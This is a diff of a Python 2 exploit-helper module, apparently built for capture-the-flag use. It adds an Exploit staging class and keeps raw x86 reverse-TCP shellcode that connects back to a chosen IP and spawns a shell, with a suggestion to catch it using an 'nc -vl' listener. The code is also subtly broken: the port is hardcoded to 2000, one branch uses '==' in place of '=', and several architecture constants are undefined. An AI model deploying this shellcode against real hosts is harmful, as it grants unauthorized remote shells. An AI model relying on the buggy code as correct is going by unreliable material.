@@ -1,25 +1,65 @@
 import re
 import socket
 import time
+import sys
 from struct import pack,unpack
 from string import ascii_lowercase as ALPHABET
 
 
-def reverse_tcp(ip_addr, port):
+class Exploit():
+    def __init__(self, ip_addr, port, exploit_type):
+        self.ip = ip_addr
+        self.port = port
+        self.type = exploit_type
+
+        self.connectback = None
+        self.bind = None
+
+        self.stage = [] # list of input to send to get to arbitrary execution
+        self.shellcode = None
+
+    def connect_back(self, ip_addr, port):
+        self.connectback = (ip_addr, port)
+
+    def bind_shell(self, port):
+        self.bind = port
+
+    def prepare(self, input):
+        self.stage.append(input)
+
+    def generate(self, arch='x86'):
+        if self.type == 'connectback':
+            if self.connectback == None:
+                raise RuntimeError("You haven't set parameters for the connect back")
+            self.shellcode = reverse_tcp(self.connectback[0], self.connectback[1], arch)
+        elif self.type == 'bind':
+            if self.bind == None:
+                raise RuntimeError("You haven't set parameters for the bind shell")
+            self.shellcode = bind_shell(self.bind, arch) # needs implementation
+
+    def display(self):
+        for x in self.stage:
+            sys.stdout.write(x)
+        sys.stdout.write(repr(self.shellcode)[1:-1])
+
+    def throw(self): # needs implementation
+        pass
+
+def reverse_tcp(ip_addr, port, arch='x86'):
     '''
     Generate x86 reverse tcp shellcode
     
     Usage:
     reverse_tcp(ip_addr, port)
-        ip_addr = connect back IP address
-        port = connect back port
+        ip_addr = connect back IP address as string
+        port = connect back port as int
 
     A command you could use to setup a listener on your system is 'nc -vl 7788'
     '''
     ip = ''.join([chr(int(x)) for x in ip_addr.split('.')])
-    port = hex(port)[2:].zfill(2).decode('hex')
+    port = hex(2000)[2:].zfill(6).decode('hex').lstrip('\x00')
 
-    REVERSE_TCP = (
+    REVERSE_TCP_X86 = (
         '\x31\xc0\x89\xc3\x50\x6a\x01\x6a\x02\x43\xb0\x66\x89\xe1\xcd\x80\x89\xc6'
         '\x31\xc0\xb0\x66\x43\x68' + ip + '\x66\x68' + port + '\x66\x53\x89\xe1'
         '\x6a\x10\x51\x56\x43\x89\xe1\xcd\x80\x89\xc7\x31\xc9\x89\xc8\x89\xca\xb1'
@@ -27,12 +67,24 @@ def reverse_tcp(ip_addr, port):
         '\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x89\xca\xcd\x80'
     )
 
+    if arch.lower() == 'x86':
+        REVERSE_TCP = REVERSE_TCP_X86
+
+    elif arch.lower() == 'x64':
+        REVERSE_TCP = REVERSE_TCP_X64 # need implementation
+
+    elif arch.lower() == 'arm':
+        REVERSE_TCP == REVERSE_TCP_ARM # need implementation
+
+    elif arch.lower() == 'mips':
+        REVERSE_TCP = REVERSE_TCP_MIPS # need implementation
+
     banned = ('\x00', '\x0a', '\x0d')
     for x in banned:
-        if x in REVERSE_TCP:
+        if x in REVERSE_TCP_X86:
             print 'This shellcode may not work because of {} at index {}'.format(repr(x), REVERSE_TCP.index(x))
 
-    return REVERSE_TCP
+    return REVERSE_TCP_X86
 
 
 def get_socket(chal):
